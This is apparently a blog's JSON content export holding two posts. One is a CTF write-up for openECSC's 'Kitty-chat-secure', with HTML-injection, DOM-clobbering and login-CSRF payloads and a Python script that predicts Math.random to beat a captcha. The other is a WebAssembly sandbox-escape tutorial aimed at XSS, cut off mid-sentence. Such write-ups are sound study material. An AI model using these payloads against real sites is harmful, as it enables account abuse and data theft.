
[{"content":"","date":"6 October 2025","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","date":"6 October 2025","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","date":"6 October 2025","externalUrl":null,"permalink":"/","section":"hibwyli","summary":"","title":"hibwyli","type":"page"},{"content":"","date":"6 October 2025","externalUrl":null,"permalink":"/authors/hibwyli/","section":"Authors","summary":"","title":"Hibwyli","type":"authors"},{"content":" Kitty-chat-secure # I just spent my last week into playing openECSC, i need a little bit skills to clear all webs but its a nice try. Below is my write up for the Kitty-chat-secure which i luckily get the second solves in 3 solves at all !!! This is a really cool challenge of @rebane. You MUST give it a try at all.\nTLDR : # Triggering the loadPrivateNotes to reveal the flag Then try to trigger loggin form as username \u0026ldquo;test\u0026rdquo; Trigger the loadPrivateNotes again then the flag will be set as note of \u0026ldquo;test\u0026rdquo; due to this code read the first value (flag) not the (note of \u0026ldquo;test\u0026rdquo; user) What we currentlly can do ? # Ok just html injection with strict csp and script-src is self. Race condition # We can load user script to load /message.js then dom clobbering to get one click abritary. To achieve that we make the bot have the \u0026ldquo;?msg=\u0026rdquo; , we can use meta redirect at the time the bot comes because it sleeps 2 second before hooking the add chat . If we redirect after the bot hook the function , we cannot interact with that bot any more \u0026hellip; await page.goto(`${host}/`); await new Promise(resolve =\u0026gt; setTimeout(resolve, 2000)); ( redirect here ) await page.evaluate(() =\u0026gt; {HOOKCHAT}) Clicking chain # The bot will click to class \u0026ldquo;redirect\u0026rdquo; and we can combine that with another gadget is : document.querySelector(\u0026#34;#loadPrivate\u0026#34;).onclick = () =\u0026gt; loadPrivateNotes(); \u0026lt;button class=\u0026#34;redirect\u0026#34; id=\u0026#34;loadPrivate\u0026#34;\u0026gt;hehe\u0026lt;/button\u0026gt;\u0026lt;script src=\u0026#34;/captcha/captcha.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;script src=\u0026#34;/account.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;script src=\u0026#34;/message.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; This will load the captcha up . Bypass captcha # Using the Math.random predict , we can collect the input using the \u0026ldquo;!fact\u0026rdquo; of the bot . Then i use this repo to predict that (https://github.com/StroppaFR/mathrandomcrack) Again dom cloberring using \u0026lt;section\u0026gt; to not be removed by javascript because it just remove the div.captcha . \u0026lt;section class=\u0026#34;captcha\u0026#34;\u0026gt; \u0026lt;p\u0026gt;Select all cats to continue:\u0026lt;/p\u0026gt; \u0026lt;div\u0026gt; \u0026lt;img src=\u0026#34;captcha/img_0.webp\u0026#34; draggable=\u0026#34;false\u0026#34; class=\u0026#34;selected\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;captcha/img_1.webp\u0026#34; draggable=\u0026#34;false\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;captcha/img_2.webp\u0026#34; draggable=\u0026#34;false\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;captcha/img_3.webp\u0026#34; draggable=\u0026#34;false\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;captcha/img_4.webp\u0026#34; draggable=\u0026#34;false\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;captcha/img_5.webp\u0026#34; draggable=\u0026#34;false\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;captcha/img_6.webp\u0026#34; draggable=\u0026#34;false\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;captcha/img_7.webp\u0026#34; draggable=\u0026#34;false\u0026#34; class=\u0026#34;selected\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;captcha/img_8.webp\u0026#34; draggable=\u0026#34;false\u0026#34; class=\u0026#34;selected\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/section\u0026gt; But we need to trigger a click again to trigger the CheckCaptcha function . We again use the gadget one click and wrap our button in a class \u0026ldquo;notes\u0026rdquo; const notesBtn = document.querySelector(\u0026#34;.notes button\u0026#34;); notesBtn.onclick = hasText ? updateNotes() : null; So we have something like :\n\u0026lt;div class=\u0026#34;notes\u0026#34;\u0026gt;\u0026lt;button class=\u0026#34;redirect\u0026#34; id=\u0026#34;loadPrivate\u0026#34;\u0026gt;hehe\u0026lt;/button\u0026gt;\u0026lt;/div\u0026gt;\u0026lt;script src=\u0026#34;/captcha/captcha.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;script src=\u0026#34;/account.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;script src=\u0026#34;/message.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;script defer src=\u0026#34;/message.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; The main ideas, is after one click our only button will be updated its onclick function and we click another time will make other things . Send second message.js to click trigger the captcha checking. After successfully , the flag now is loaded .\nSend flag to another user . # After the flag is revealed , im getting stuck here and think about something html to leak the flag but it seem impossible. Finally when i focus the function loadPrivateNotes , i found something sus. When updating the notes , it not read the \u0026ldquo;input.value\u0026rdquo; but read from document.querySelector and just get the first one now (=\u0026gt;FLAG)\nbody: JSON.stringify({ key: await getUserKey(), note: document.querySelector(\u0026#34;.notes input\u0026#34;).value }), This is very sus because what if we have something like : The flag will be sent instead of the others note because it query just get the first one appear!!\nThen this lead me to a solution ! If we can use the one click to make a login request as our user? Then load private notes again and the flag will be sent to our users !!!\nSo we make a form submit to login as username \u0026ldquo;test\u0026rdquo; : I just paste this in the console\nsocket.send(JSON.stringify({ type: \u0026#39;LOGIN\u0026#39;, username: \u0026#39;\u0026lt;p href =\u0026#34;/\u0026#34; id=\u0026#34;username\u0026#34;\u0026gt;\u0026lt;/p\u0026gt;\u0026lt;p id=\u0026#34;message\u0026#34;\u0026gt;\u0026lt;form action=\u0026#34;/login\u0026#34; method=\u0026#34;POST\u0026#34; target=\u0026#34;hidden_iframe\u0026#34;\u0026gt;\u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;password\u0026#34; value=\u0026#34;test\u0026#34;\u0026gt;\u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;username\u0026#34; value=\u0026#34;test\u0026#34;\u0026gt;\u0026lt;button class=\u0026#34;redirect\u0026#34; type=\u0026#34;submit\u0026#34;\u0026gt;Save\u0026lt;/button\u0026gt;\u0026lt;/form\u0026gt;\u0026lt;script src=\u0026#34;/message.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\u0026#39; })); socket.send(JSON.stringify({ type: \u0026#39;START\u0026#39;, username: \u0026#39;awef\u0026#39; })); After that we need to trigger loadPrivates and bypass captcha again to trigger update notes. To trigger update notes we use the same trick when clicking twice at clicking captcha.\nMy flow like this :\nPaste this to console at right time :\nsocket.send(JSON.stringify({ type: \u0026#39;LOGIN\u0026#39;, username: \u0026#39; \u0026lt;meta http-equiv=\u0026#34;refresh\u0026#34; content=\u0026#34;0;url=?msg=hihi\u0026#34;\u0026gt;\u0026#39; })); socket.send(JSON.stringify({ type: \u0026#39;START\u0026#39;, username: \u0026#39;awef\u0026#39; })); Then run this collect and predict script :\nimport asyncio import os import re import json import random import aiohttp import websockets import ast BASE_URL = \u0026#34;http://localhost:3000\u0026#34; # ƒë·ªïi sang domain WS_URL = \u0026#34;ws://localhost:3000\u0026#34; # wss:// n·∫øu ch·∫°y HTTPS BASE_URL = \u0026#34;https://ff7ccd0a-4927-42aa-82d0-5cca00fc80e5.openec.sc:1337\u0026#34; # ƒë·ªïi sang domain WS_URL = \u0026#34;wss://ff7ccd0a-4927-42aa-82d0-5cca00fc80e5.openec.sc:1337\u0026#34; # wss:// n·∫øu ch·∫°y HTTPS # flag{y0u_4r3_pr3tty_p4w3s0m3_f0r_s0lv1ng_th1s_w1th_th3_c5p} # flag{y0u_4r3_pr3tty_p4w3s0m3_f0r_s0lv1ng_th1s_w1th_th3_c5p} FUN_FACTS = [ \u0026#34;ecsc 2023 took place in norway\u0026#34;, \u0026#34;ecsc 2024 took place in italy\u0026#34;, \u0026#34;ecsc 2025 will take place in poland\u0026#34;, \u0026#34;cats have 8 feet (this is not actually a real fact)\u0026#34;, \u0026#34;i am a bot\u0026#34;, \u0026#34;i love music!!\u0026#34;, \u0026#34;you can store notes in kittychat\u0026#34;, \u0026#34;you\u0026#39;re awesome!\u0026#34;, \u0026#34;using csp is a great way to make your website unhackable\u0026#34;, \u0026#34;did you know that vikingskipet was built for the ice skating competition during the winter olympics in 1994?\u0026#34;, \u0026#34;the solution to this challenge is: flag{dQw4w9WgXcQ}\u0026#34;, \u0026#34;if you type your credit card number in the chat it\u0026#39;ll appear censored! try it :3\u0026#34; ] LEAK = [] username = f\u0026#34;kitten_{random.randint(1000,9999)}\u0026#34; user = {} socket = None current_channel = None admin_seen = asyncio.Event() admin_id = None # real admin username SCALED_VALUES_PATH = \u0026#34;./mathrandomcrack/samples/scaled_values.txt\u0026#34; SCALED_BOOLS_PATH = \u0026#34;./mathrandomcrack/samples/scaled_bools.txt\u0026#34; async def fetch_user(): global user, username async with aiohttp.ClientSession() as session: try: async with session.get(f\u0026#34;{BASE_URL}/user\u0026#34;) as resp: if resp.status == 200: user = await resp.json() if \u0026#34;username\u0026#34; in user: username = user[\u0026#34;username\u0026#34;] print(f\u0026#34;Logged in as {username}\u0026#34;) except Exception as e: print(\u0026#34;No user session:\u0026#34;, e) def find_fact_index(msg: str, facts_list: list) -\u0026gt; int: try: return facts_list.index(msg) except ValueError: return -1 def extract_msg(text: str): # returns (user, body) or (None, trimmed_text) m = re.match(r\u0026#39;^\\s*\u0026lt;([^\u0026gt;]+)\u0026gt;\\s*(.*)$\u0026#39;, text, flags=re.DOTALL) if m: return m.group(1), m.group(2).strip() return None, text.strip() def add_chat_message(msg: str): user_, body = extract_msg(msg) if body: index = find_fact_index(body, FUN_FACTS) if index != -1: LEAK.append(index) print(f\u0026#34;Current leak:{LEAK} LEN={len(LEAK)}\u0026#34;) if len(LEAK) \u0026gt;= 75: print(\u0026#34;\\nüéâ Leak complete! Writing FUN_FACTS to leak.txt\\n\u0026#34;) # ensure directory exists os.makedirs(os.path.dirname(SCALED_VALUES_PATH), exist_ok=True) with open(SCALED_VALUES_PATH, \u0026#34;w\u0026#34;, encoding=\u0026#34;utf-8\u0026#34;) as f: for idx in LEAK: f.write(str(idx) + \u0026#34;\\n\u0026#34;) # schedule processing (non-blocking) try: loop = asyncio.get_event_loop() loop.create_task(process_leak_file(SCALED_VALUES_PATH)) except RuntimeError: # if called outside running loop, run synchronously (rare) asyncio.run(process_leak_file(SCALED_VALUES_PATH)) LEAK.clear() # formatting output if msg.startswith(\u0026#34;===\u0026#34;): print(f\u0026#34;\\033[90m{msg}\\033[0m\u0026#34;) elif user_ and user_ != username: print(f\u0026#34;\\033[91m{msg}\\033[0m\u0026#34;) elif user_ == username: print(f\u0026#34;\\033[94m{msg}\\033[0m\u0026#34;) else: print(msg) # detect real admin by special intro line if body and \u0026#34;use !help to find out what i can do\u0026#34; in body: global admin_id if admin_id is None and user_: admin_id = user_ print(f\u0026#34;‚úÖ Confirmed real admin: {admin_id}\u0026#34;) admin_seen.set() # --- run mathrandomcrack on the saved file, parse output, produce boolean array --- async def process_leak_file(filepath: str): \u0026#34;\u0026#34;\u0026#34; Runs: python3 -m mathrandomcrack --method scaled --next 9 --factor 12 --output-fmt doubles {filepath} Captures stdout, finds the \u0026#39;Predicted next 9 values: [...]\u0026#39; line(s), takes the last occurrence, parses the list, converts to booleans (v\u0026gt;0.5), prints and writes booleans to SCALED_BOOLS_PATH (one per line as 0/1 or True/False JSON). \u0026#34;\u0026#34;\u0026#34; cmd = [ \u0026#34;python3\u0026#34;, \u0026#34;-m\u0026#34;, \u0026#34;mathrandomcrack\u0026#34;, \u0026#34;--method\u0026#34;, \u0026#34;scaled\u0026#34;, \u0026#34;--next\u0026#34;, \u0026#34;9\u0026#34;, \u0026#34;--factor\u0026#34;, \u0026#34;12\u0026#34;, \u0026#34;--output-fmt\u0026#34;, \u0026#34;doubles\u0026#34;, filepath ] print(f\u0026#34;Running: {\u0026#39; \u0026#39;.join(cmd)}\u0026#34;) try: proc = await asyncio.create_subprocess_exec( *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE ) except FileNotFoundError as e: print(\u0026#34;Failed to start mathrandomcrack: python3 or module not found.\u0026#34;, e) return stdout_bytes, stderr_bytes = await proc.communicate() stdout = stdout_bytes.decode(errors=\u0026#34;ignore\u0026#34;) stderr = stderr_bytes.decode(errors=\u0026#34;ignore\u0026#34;) if stderr: print(\u0026#34;mathrandomcrack stderr:\u0026#34;, stderr) # Find the last \u0026#34;Predicted next ... values: [...]\u0026#34; line matches = re.findall(r\u0026#34;Predicted next \\d+ values:\\s*(\\[[^\\]]*\\])\u0026#34;, stdout) if not matches: print(\u0026#34;No prediction line found in mathrandomcrack output.\u0026#34;) print(\u0026#34;Full stdout for debugging:\\n\u0026#34;, stdout) return last_list_text = matches[-1] # Parse the Python-style list safely try: values = ast.literal_eval(last_list_text) if not isinstance(values, (list, tuple)) or len(values) == 0: raise ValueError(\u0026#34;Parsed value is not a non-empty list\u0026#34;) except Exception as e: print(\u0026#34;Failed to parse predicted values:\u0026#34;, e) print(\u0026#34;List text was:\u0026#34;, last_list_text) return # Ensure we have 9 values (best-effort) print(f\u0026#34;Parsed predicted values ({len(values)}): {values}\u0026#34;) bools = [bool(v \u0026gt; 0.5) for v in values] print(\u0026#34;Converted to booleans (True if \u0026gt;0.5):\u0026#34;, bools) # Write boolean results (JSON) and also a human-readable 0/1 file try: os.makedirs(os.path.dirname(SCALED_BOOLS_PATH), exist_ok=True) with open(SCALED_BOOLS_PATH, \u0026#34;w\u0026#34;, encoding=\u0026#34;utf-8\u0026#34;) as f: json.dump({\u0026#34;predicted_values\u0026#34;: values, \u0026#34;bools\u0026#34;: bools}, f, indent=2) with open(SCALED_BOOLS_PATH + \u0026#34;.lines\u0026#34;, \u0026#34;w\u0026#34;, encoding=\u0026#34;utf-8\u0026#34;) as f: for b in bools: f.write((\u0026#34;1\\n\u0026#34; if b else \u0026#34;0\\n\u0026#34;)) print(f\u0026#34;Wrote booleans to {SCALED_BOOLS_PATH} and {SCALED_BOOLS_PATH}.lines\u0026#34;) except Exception as e: print(\u0026#34;Failed to write booleans to disk:\u0026#34;, e) # --- socket helpers --- async def send_socket(ws, data: dict): await ws.send(json.dumps(data)) async def send_chat(ws, text: str): await send_socket(ws, {\u0026#34;type\u0026#34;: \u0026#34;MESSAGE\u0026#34;, \u0026#34;text\u0026#34;: text}) async def send_start(ws, username: str): await send_socket(ws, {\u0026#34;type\u0026#34;: \u0026#34;START\u0026#34;, \u0026#34;username\u0026#34;: username}) async def send_login(ws, username: str, key: str): await send_socket(ws, {\u0026#34;type\u0026#34;: \u0026#34;LOGIN\u0026#34;, \u0026#34;username\u0026#34;: username, \u0026#34;key\u0026#34;: key}) async def init_socket(): global socket, current_channel, user, username, admin_id async with websockets.connect(WS_URL) as ws: socket = ws if user.get(\u0026#34;userkey\u0026#34;): await send_login(ws, username, user[\u0026#34;userkey\u0026#34;]) await send_start(ws, username) async def sender(): # request admin first for i in range(75): await send_chat(ws, \u0026#34;!fact\u0026#34;) await asyncio.sleep(0.3) # prevent flooding too fast print(\u0026#34;‚úÖ Finished sending 75 !fact commands\u0026#34;) # then switch to manual input while True: msg = await asyncio.get_event_loop().run_in_executor(None, input, \u0026#34;\u0026gt; \u0026#34;) if msg.strip().lower() == \u0026#34;quit\u0026#34;: break await send_chat(ws, msg) async def receiver(): try: async for message in ws: data = json.loads(message) match data[\u0026#34;type\u0026#34;]: case \u0026#34;CHANNEL\u0026#34;: current_channel = f\u0026#34;#{data[\u0026#39;channel\u0026#39;]}\u0026#34; add_chat_message(f\u0026#34;=== joined {current_channel} ===\u0026#34;) case \u0026#34;USERS\u0026#34;: users = data[\u0026#34;users\u0026#34;] print(\u0026#34;Currently online:\u0026#34;, \u0026#34;, \u0026#34;.join(users)) case \u0026#34;MESSAGE\u0026#34;: add_chat_message(data[\u0026#34;text\u0026#34;]) case _: print(\u0026#34;Unknown:\u0026#34;, data) except websockets.ConnectionClosed: add_chat_message(\u0026#34;=== connection lost ===\u0026#34;) await asyncio.gather(sender(), receiver()) async def main(): await fetch_user() await init_socket() if __name__ == \u0026#34;__main__\u0026#34;: asyncio.run(main()) After that run the genHtml.py below to get a payload to paste into console :\ngenHtml.py\nimport json file_path = \u0026#34;./mathrandomcrack/samples/scaled_bools.txt\u0026#34; with open(file_path, \u0026#34;r\u0026#34;, encoding=\u0026#34;utf-8\u0026#34;) as f: data = json.load(f) bool_array = data.get(\u0026#34;bools\u0026#34;, []) print(\u0026#34;Boolean array:\u0026#34;, bool_array) img_srcs = [f\u0026#34;captcha/img_{i}.webp\u0026#34; for i in range(0,9)] html_lines = [\u0026#39;\u0026lt;section class=\u0026#34;captcha\u0026#34;\u0026gt;\u0026#39;, \u0026#39; \u0026lt;p\u0026gt;Select all cats to continue:\u0026lt;/p\u0026gt;\u0026#39;, \u0026#39; \u0026lt;div\u0026gt;\u0026#39;] for idx, selected in enumerate(bool_array): cls = \u0026#39; class=\u0026#34;selected\u0026#34;\u0026#39; if selected else \u0026#39;\u0026#39; html_lines.append(f\u0026#39; \u0026lt;img src=\u0026#34;{img_srcs[idx]}\u0026#34; draggable=\u0026#34;false\u0026#34;{cls}\u0026gt;\u0026#39;) html_lines.append(\u0026#39; \u0026lt;/div\u0026gt;\u0026#39;) html_lines.append(\u0026#39; \u0026lt;div class=\u0026#34;notes\u0026#34;\u0026gt;\u0026lt;button class=\u0026#34;redirect\u0026#34; id=\u0026#34;loadPrivate\u0026#34;\u0026gt;hehe\u0026lt;/button\u0026gt;\u0026lt;/div\u0026gt;\u0026lt;script src=\u0026#34;/captcha/captcha.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\u0026#39;) html_lines.append(\u0026#39;\u0026lt;/section\u0026gt;\u0026#39;) html_result = \u0026#34;\\n\u0026#34;.join(html_lines).replace(\u0026#34;\\n\u0026#34;,\u0026#34;\u0026#34;) print(\u0026#34;\\n\u0026#34;.join(html_lines)) template1=\u0026#39;\u0026#39;\u0026#39; socket.send(JSON.stringify({ type: \u0026#39;LOGIN\u0026#39;, username: \u0026#39;{payload}\u0026lt;p id=\u0026#34;username\u0026#34;\u0026gt;\u0026lt;/p\u0026gt;\u0026lt;p href =\u0026#34;/\u0026#34; id=\u0026#34;loadPrivate\u0026#34;\u0026gt;\u0026lt;/p\u0026gt;\u0026lt;p id=\u0026#34;message\u0026#34;\u0026gt;\u0026lt;/p\u0026gt;\u0026lt;script src=\u0026#34;/account.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;script src=\u0026#34;/message.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;script defer src=\u0026#34;/message.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;script defer src=\u0026#34;/message.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\u0026#39; })); socket.send(JSON.stringify({ type: \u0026#39;START\u0026#39;, username: \u0026#39;awef\u0026#39; }));\u0026#39;\u0026#39;\u0026#39; print(template1.replace(\u0026#34;{payload}\u0026#34;,html_result)) After pasting done , the captcha get bypassed and the note is reveal then logging as \u0026ldquo;test\u0026rdquo; user like above.\nThen run the genHtml.py again and paste into console then check out the \u0026ldquo;test\u0026rdquo; user and we have the flag !! Flag : flag{y0u_4r3_pr3tty_p4w3s0m3_f0r_s0lv1ng_th1s_w1th_th3_c5p}\nClosing thought : # I really love this challenge when no thing really news !! When just basic stuffs get combined and a very great challenge get born ! Thanks to @rebane for creating a very cool challenge !!!\n","date":"6 October 2025","externalUrl":null,"permalink":"/posts/kitty-chat-secure/","section":"Posts","summary":"Kitty-chat-secure # I just spent my last week into playing openECSC, i need a little bit skills to clear all webs but its a nice try. Below is my write up for the Kitty-chat-secure which i luckily get the second solves in 3 solves at all !!! This is a really cool challenge of @rebane. You MUST give it a try at all.\nTLDR : # Triggering the loadPrivateNotes to reveal the flag Then try to trigger loggin form as username \u0026ldquo;test\u0026rdquo; Trigger the loadPrivateNotes again then the flag will be set as note of \u0026ldquo;test\u0026rdquo; due to this code read the first value (flag) not the (note of \u0026ldquo;test\u0026rdquo; user) What we currentlly can do ?","title":"openECSC 2025","type":"posts"},{"content":"","date":"6 October 2025","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"6 October 2025","externalUrl":null,"permalink":"/tags/web/","section":"Tags","summary":"","title":"Web","type":"tags"},{"content":"","date":"6 October 2025","externalUrl":null,"permalink":"/categories/writeup/","section":"Categories","summary":"","title":"Writeup","type":"categories"},{"content":"Resource : https://media.ccc.de/v/why2025-226-escaping-a-misleading-sandbox-breaking-the-webassembly-javascript-barrier https://webassembly.github.io/spec/core/intro/introduction.html https://developer.mozilla.org/en-US/docs/WebAssembly https://phrack.org/issues/72/10_md#article\nWhat is wasm ? # In short, its used for optimizing some actions for the browser. It doesn\u0026rsquo;t have any access to Dom or Javascript Web Api . The only way it can interact with that is through an import object . But we should learn some basic first . Understanding WebAssembly text format # There\u0026rsquo;s 2 type of file , wat and wasm. But we should code in wat because it is readable form. Some basic opcodes : Create module (module) Function ( func \u0026lt;signature\u0026gt; \u0026lt;locals\u0026gt; \u0026lt;body\u0026gt; ) Example :\n(func (param i32) (param f32) (local f64) local.get 0 =\u0026gt; Lay param 0 local.get 1 =\u0026gt; lay param 1 local.get 2) =\u0026gt; lay bien cuc bo dau tien The main ideas is base on STACK MACHINE VM : Local.get will push the param 0 on the stack. Local.set will pop the value from the stack and set into the param 0. Data types : # There\u0026rsquo;s no string, array, object, blabla in web assembly. It just has Integer , Float and Reference type Reference type has 3 things : funcref ‚Üí Reference to a WebAssembly function externref ‚Üí Reference to an external (host/JavaScript) value, e.g., a DOM object or string anyref (older proposal, now split into more specific ones) ‚Üí Supertype of all reference types IMPORTANT :\nexternref is an opaque reference type, meaning: It can hold any host (external) value that is passed in from outside WebAssembly. Examples: JavaScript objects, DOM nodes, strings, functions, etc. It is opaque to WebAssembly itself: Wasm cannot inspect the contents (e.g., you can‚Äôt get the string length of a externref inside Wasm). Wasm can only store it, pass it around, compare it, or return it back to the host. All actual operations on the object must be done on the host side (e.g., JavaScript). Memory : # A contiguous block of raw bytes (like a giant array of bytes). Table : # A table is like a linear memory, but instead of holding bytes, it holds references (e.g., function references or extern references). We can call a function from table with this :\n(func $f1 (result i32) i32.const 111) (func $f2 (result i32) i32.const 222) (func (export \u0026#34;callIndirect\u0026#34;) (param i32) (result i32) local.get 0 call_indirect (type $t) ;; calls table[index] ) (type $t (func (result i32))) Javascript stuffs # So now we will talk about the Javascript. We understand that the wasm is just so strictly to do anything because its data type. But there\u0026rsquo;s a support for using a Import object that allow the wasm run the Javascript code . Example :\n(module (import \u0026#34;js\u0026#34; \u0026#34;log\u0026#34; (func $log (param i32))) (func (export \u0026#34;run\u0026#34;) i32.const 42 call $log ) ) This will import the \u0026ldquo;log\u0026rdquo; function from namespace \u0026ldquo;js\u0026rdquo; from the Javascript put into and set with name $log then call with argument 42. In the Javascript side , we have the following. const importObject = { js: { log: (x) =\u0026gt; console.log(\u0026#34;WASM says:\u0026#34;, x) } }; WebAssembly.instantiateStreaming(fetch(\u0026#34;example.wasm\u0026#34;), importObject) .then(obj =\u0026gt; { obj.instance.exports.run(); // ‚Üí \u0026#34;WASM says: 42\u0026#34; }); Result in :\nSo what\u0026rsquo;s happen here ? The WASM itself not have any powerful magic . It just pass the function reference of console.log and call it with a number (even not a string). If the user not give any malicous importObject, the WASM should be very safe !!\nBut \u0026hellip;\nEscape sandbox # At WHY2025CTF there\u0026rsquo;s a super great talk about a technique that help us escape the sandbox and trigger XSS : https://www.youtube.com/watch?v=-MS4BV0-ry4.\nPrototype chain : # So first we will need to understand how the WASM defined to read the import objects. So it loops through the module name and using the \u0026ldquo;GET\u0026rdquo; with our import object and module name . So what is the \u0026ldquo;GET\u0026rdquo; So it calls [[GET]] So finally it will call the OrdinaryGet and the magic goes here. It will read the PROTOTYPE too !!!. This thing is something like prototype pollution, but now we have a proof why it exists !\nSo that\u0026rsquo;s mean this code will work too ?\nObject.prototype.js= { log : (x) =\u0026gt; console.log(\u0026#34;WASM says:\u0026#34;, x) } WebAssembly.instantiateStreaming(fetch(\u0026#34;example.wasm\u0026#34;), {}) .then(obj =\u0026gt; { obj.instance.exports.run(); // ‚Üí \u0026#34;WASM says: 42\u0026#34; }); Yes , it freaking works But how this help us ? Do you remember that the syntax in wat file is something like :\n(import (namespace) (func)) What if we use use something like :\nObject.toString.constructor ( which is Function) And in the wat , due to Prototype Chain we can import it likes this :\n(import \u0026#34;toString\u0026#34; \u0026#34;constructor\u0026#34; (func $function (param externref) (result externref))) Full code :\n(module (import \u0026#34;js\u0026#34; \u0026#34;log\u0026#34; (func $log (param externref))) (import \u0026#34;toString\u0026#34; \u0026#34;constructor\u0026#34; (global $function externref )) (func (export \u0026#34;run\u0026#34;) global.get $function call $log ) ) \u0026lt;h1\u0026gt;HIHI\u0026lt;/h1\u0026gt; \u0026lt;script\u0026gt; importObject = { js : { log : (x) =\u0026gt; console.log(\u0026#34;WASM says:\u0026#34;, x) } } WebAssembly.instantiateStreaming(fetch(\u0026#34;example.wasm\u0026#34;), importObject) .then(obj =\u0026gt; { obj.instance.exports.run(); // ‚Üí \u0026#34;WASM says: 42\u0026#34; }); \u0026lt;/script\u0026gt; Result in :\nHoly facks !!! It can trigger something super unintended. So how from this we can trigger a xss ? Because we need something like :\nFunction(\u0026#34;alert()\u0026#34;)() But now just can call Function() without any string put into it \u0026hellip; We can put arguments into that but just number .. so unuseful\u0026hellip;\nHow to build a string . # To solve this problems , we call use the String.fromCharCode . And to get the String.fromCharCode , we will need this : So now we need to have a initial string and access its namespaces . There\u0026rsquo;s so many ways we can have an initial string. Example :\nWith the things that we can access the prorotype with wasm, this is super possible. Try to implement this into our wat.\n(module (import \u0026#34;js\u0026#34; \u0026#34;log\u0026#34; (func $log (param externref))) (import \u0026#34;constructor\u0026#34; \u0026#34;prototype\u0026#34; (global $oops externref )) (import \u0026#34;constructor\u0026#34; \u0026#34;values\u0026#34; (func $values (param externref) (result externref))) (import \u0026#34;constructor\u0026#34; \u0026#34;getOwnPropertyNames\u0026#34; (func $getOwnProp (param externref) (result externref))) (func (export \u0026#34;run\u0026#34;) (global.get $oops) call $values call $getOwnProp call $log ) ) Here we go !!! So how we can extract this string out ??. The only way gadget is Object.groupBy this is super useful in all this chain. There\u0026rsquo;s interesting in Object.groupBy is that the value return from the callback will set into key !!! Remember that because we need it so much. Now, which callback should we use ? In fact, we can use our own WASM function to be the callback to solve this stuffs !!! The ideas is just loop through to that index and save the values at that into our global vars externref !! We dont really read or write anythings in js because we follow the opaque !! So let\u0026rsquo;s implement that function into wat. We finally have :\n(module (import \u0026#34;js\u0026#34; \u0026#34;log\u0026#34; (func $log (param externref))) (import \u0026#34;constructor\u0026#34; \u0026#34;prototype\u0026#34; (global $oops externref )) (import \u0026#34;constructor\u0026#34; \u0026#34;values\u0026#34; (func $values (param externref) (result externref))) (import \u0026#34;constructor\u0026#34; \u0026#34;getOwnPropertyNames\u0026#34; (func $getOwnProp (param externref) (result externref))) (import \u0026#34;constructor\u0026#34; \u0026#34;groupBy\u0026#34; (func $groupBy_i (param externref funcref) (result externref))) (global $g_n (mut i32) (i32.const 0)) (global $g_nth_element (mut externref) (ref.null extern)) (table 1 funcref) (elem (i32.const 0) $save_first_element) (func (export \u0026#34;run\u0026#34;) (global.get $oops) call $values call $getOwnProp i32.const 0 call $array_get_nth_element call $log ) (func $array_get_nth_element (param $arr externref) (param $n i32) (result externref) (local.get $n) (global.set $g_n) ;; get funcref from table instead of raw ref.func (local.get $arr) (ref.func $save_first_element) ;; ‚úÖ now valid because $save_first_element is in elem call $groupBy_i drop (global.get $g_nth_element) ) (func $save_first_element (param $val externref) (param $n i32) (if (i32.eq (local.get $n) (global.get $g_n)) (then local.get $val global.set $g_nth_element ) ) ) ) Because shows the code is too long so I hope you will try to code it . Access namespace # So the next step will be access the namespace to obtain the String.fromCharCode . The chains now is :\nTest it to better understand the as well as code it out. Finally you will have the String.fromCharCode . Build char # So to build the chars, we will use Object.groupBy magic i told before !! We can create a function in wat that just auto return the ord and put it as call back of the groupBy . Then that value will be set into the keys. After that, call Object.keys to extract that into an array. Finally, again using the String.FromCharCode we get above to convert that array into a string and use Object.keys to read that and filter out the \u0026lsquo;\\x00\u0026rsquo; out with $array_nth_element we get above. From char to string # Chain :\nHere to create the \u0026ldquo;{\u0026lsquo;1\u0026rsquo;:\u0026lsquo;H\u0026rsquo;}\u0026rdquo; , I implement a function like this :\ni32.const 1 i32.const 97 call $addKeyMapCharArray (func $addKeyMapCharArray (param $key i32) (param $char i32) local.get $key local.get $char call $keyMapCharArray (global.get $prevObj) call $assign (global.set $prevObj) ) (func $keyMapCharArray (param $key i32) (param $char i32)(result externref) (local.get $char) call $createChar (local.get $key) (global.set $charToGen) (ref.func $genChar) call $groupBy_i ) So basically, it will use groupBy again with key is the value return from the callback and values is our string . Like this :\nYou see the groupBy is too powerfull :DD . Then my function will assign the result with $prevObj to build this chain : Then we call Object.values to get an arrays. Finally we will use the final methods is String.raw (we can obtain this same as fromCharCode)\nOkay so it should easy right \u0026hellip; just build a raw key with Object.groupBy and call String.raw with Object.groupBy again \u0026hellip; This patterns repeated until we win.\nBut wait, when we have the {raw : \u0026hellip;.} and we call the String.raw with Object.groupBy , it will be error because we need an array !! So the only way we can do is : What am i doing here ? My main goal 